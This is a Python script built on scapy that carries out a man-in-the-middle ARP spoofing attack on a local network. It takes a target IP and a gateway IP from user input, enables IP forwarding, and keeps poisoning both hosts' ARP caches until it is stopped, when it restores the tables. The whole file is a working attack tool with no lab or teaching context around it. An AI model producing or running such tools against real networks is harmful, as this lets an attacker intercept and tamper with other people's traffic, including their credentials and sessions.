#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import os
import sys
import time

packet_count = 0  # Global variable to count packets

def get_mac(ip):
    # Send ARP request to get the MAC address of the IP
    ans, unans = arping(ip, verbose=False)
    for snt, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    global packet_count
    # Create ARP response packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, verbose=False)
    packet_count += 1
    print(f"[*] Sent ARP spoof packet {packet_count} to {target_ip}")

def restore(target_ip, source_ip, target_mac, source_mac):
    global packet_count
    # Create ARP response packet to restore the ARP table
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, count=4, verbose=False)
    packet_count += 4  # We are sending 4 packets in restore function
    print(f"[*] Sent ARP restore packets {packet_count - 3}-{packet_count} to {target_ip}")

def forward_packet(packet):
    if packet.haslayer(IP):
        # Check if the packet is from the target to the gateway
        if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
            packet[Ether].dst = gateway_mac
            sendp(packet, verbose=False)
        # Check if the packet is from the gateway to the target
        elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
            packet[Ether].dst = target_mac
            sendp(packet, verbose=False)

if __name__ == "__main__":
    # User input for target and gateway IP addresses
    target_ip = input("Enter Target IP: ")
    gateway_ip = input("Enter Gateway IP: ")
    interface = input("Enter Network Interface (e.g., eth0, wlan0): ")

    # Get MAC addresses of target and gateway
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("Failed to get MAC address. Exiting.")
        sys.exit(1)

    # Enable IP forwarding on the attacker machine
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop.")
        while True:
            # Spoof the target
            spoof(target_ip, gateway_ip, target_mac)
            # Spoof the gateway
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
            print(f"[*] Total packets sent: {packet_count}")
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing. Restoring network configuration...")
        # Restore the network configuration
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Network configuration restored. Exiting.")
